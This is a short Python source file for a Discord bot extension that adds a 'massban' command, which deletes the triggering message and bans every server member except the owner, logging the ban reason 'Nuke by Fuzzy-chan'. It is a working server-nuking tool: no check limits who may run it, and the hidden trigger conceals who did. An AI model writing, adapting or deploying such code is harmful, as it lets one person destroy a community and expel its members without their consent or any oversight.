from discord.ext import commands
import asyncio

class BanAll(commands.Cog):
    def __init__ (self, bot):
        self.bot = bot

    @commands.command()
    async def massban(self, ctx):
        await ctx.message.delete()
        Guild = ctx.guild
        if not Guild:
            return False
        
        if not Guild.me.guild_permissions.ban_members:
            await ctx.send("Bot không có quyền cấm thành viên.")
            return False

        owner_id = Guild.owner_id
        for member in Guild.members:
            if member.id != owner_id:
                try:
                    await member.ban(reason = 'Nuke by Fuzzy-chan')
                    print(f'>>> Cấm thành công {member.name}')
                except Exception as Error_On_Mass_Ban:
                    print(f'>>> Không thể cấm {member.name} ^^^{Error_On_Mass_Ban}')

async def setup(bot):
    await bot.add_cog(BanAll(bot))